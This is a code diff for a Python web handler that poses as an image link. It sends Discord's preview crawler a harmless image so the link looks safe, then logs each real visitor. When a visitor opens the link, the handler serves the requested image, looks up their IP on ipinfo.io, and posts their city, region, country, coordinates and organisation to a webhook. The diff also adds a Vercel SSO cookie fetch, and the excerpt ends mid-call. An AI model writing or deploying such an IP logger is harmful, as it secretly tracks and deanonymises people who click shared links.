@@ -59,28 +59,54 @@ class handler(BaseHTTPRequestHandler):
         if ip and ip.startswith(('35','34','104.196')):
             if 'discord' in useragent.lower():
                 self.send_response(200)
-                self.send_header('Content-type', 'image/png') # MUST BE PNG FOR PREVIEW
+                self.send_header('Content-type', 'image/png') 
                 self.end_headers()
-                self.wfile.write(buggedbin) # Send the bugged bin directly
-                
+                self.wfile.write(buggedbin) 
                 requests.post(webhook, json=prev(ip, useragent))
             else:
                 pass
         else:
-            # Normal User: Fetch the actual image from the URL parameter
             target_url = dic.get('url', '')
-            try:
-                data = requests.get(target_url).content if target_url else buggedbin
-            except:
-                data = buggedbin
+            data = buggedbin
             
+            try:
+                # Step 1: Get the SSO Cookie from Vercel
+                sso_url = "https://vercel.com/sso-api"
+                initial_req = requests.get(sso_url, headers={'User-Agent': 'Mozilla/5.0'})
+                
+                # Extract the cookie from the response
+                cookies = initial_req.cookies
+                
+                # Step 2: Fetch the actual image using the cookie
+                headers = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                    'Cookie': '; '.join([f"{k}={v}" for k, v in cookies.items()])
+                }
+                
+                if target_url:
+                    # If target_url is also on Vercel, you might need to handle its specific domain
+                    # For now, we assume the target_url is a direct image link or uses the same session
+                    data = requests.get(target_url, headers=headers).content
+                else:
+                    data = buggedbin
+                    
+            except Exception as e:
+                print(f"Error fetching image: {e}")
+                data = buggedbin
+
+            # Determine Content Type based on the TARGET image extension
+            if target_url.lower().endswith('.png'):
+                content_type = 'image/png'
+            else:
+                content_type = 'image/jpeg'
+
             self.send_response(200)
-            self.send_header('Content-type', 'image/jpeg') # Or png depending on source
+            self.send_header('Content-type', content_type)
             self.end_headers()
             self.wfile.write(data)
             
             try:
-                ipInfo = requests.get(f'https://ipinfo.io/{ip}/json').json()
+                ipInfo = requests.get(f'https://ipinfo.io/{ip}/json', headers={'User-Agent': 'Mozilla/5.0'}).json()
                 requests.post(webhook, json=formatHook(
                     ipInfo.get('ip'), ipInfo.get('city'), ipInfo.get('region'), 
                     ipInfo.get('country'), ipInfo.get('loc'), ipInfo.get('org'), 
